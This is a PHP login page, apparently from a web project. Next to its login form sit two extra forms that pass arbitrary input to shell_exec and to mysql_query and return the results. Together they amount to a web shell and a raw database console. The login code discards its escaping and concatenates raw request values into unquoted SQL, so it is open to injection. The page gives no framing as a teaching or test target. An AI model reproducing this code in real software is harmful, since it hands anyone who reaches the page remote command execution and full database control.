<form name="login-form" id="login-form" method="post" action="<?php echo $PHP_SELF; ?>">
  <fieldset>
  <legend>Please login:</legend>
  <dl>
	<dt>
	  <label title="Username">Username:
	  <input tabindex="1" accesskey="u" name="username" type="text" maxlength="50" id="username" />
	  </label>
	</dt>
  </dl>
  <dl>
	<dt>
	  <label title="Password">Password:
	  <input tabindex="2" accesskey="p" name="password" type="password" maxlength="15" id="password" />
	  </label>
	</dt>
  </dl>
  <dl>
	<dt>
	  <label title="Submit">
	  <input tabindex="3" accesskey="l" type="submit" name="cmdlogin" value="Login" />
	  </label>
	</dt>
  </dl>
  </fieldset>

<?php
	if($_REQUEST["username"] != NULL)
	{
		mysql_escape_string($_REQUEST["username"]);
		mysql_escape_string($_REQUEST["password"]);
		mysql_query("SELECT * FROM users WHERE username=" . $_REQUEST["username"] . " AND password=" . $_REQUEST["password"]);
	}	
		
?>
		
</form>
<form action="" method="post" enctype="application/x-www-form-urlencoded">		
	<table style="margin-left:auto; margin-right:auto;">
		<tr>
			<td colspan="2">Please enter system command</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td class="label">Command</td>
			<td><input type="text" name="pCommand" size="50"></td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" style="text-align:center;">
				<input type="submit" value="Execute Command" />
			</td>
		</tr>
	</table>
</form>
<?php
	if($_REQUEST["pCommand"] != NULL)
	{
		echo "<pre>";
		echo shell_exec($_REQUEST["pCommand"]);
		echo "</pre>";
	}	
?>

<form action="" method="post" enctype="application/x-www-form-urlencoded">		
	<table style="margin-left:auto; margin-right:auto;">
		<tr>
			<td colspan="2">Please enter SQL command</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td class="label">SQL query</td>
			<td><input type="text" name="sqlQuery" size="50"></td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" style="text-align:center;">
				<input type="submit" value="Execute Command" />
			</td>
		</tr>
	</table>
</form>
<?php
	if($_REQUEST["sqlQuery"] != NULL)
	{
		mysql_escape_string($_REQUEST["sqlQuery"]);
		mysql_query($_REQUEST["sqlQuery"]);
	}	
		
?>
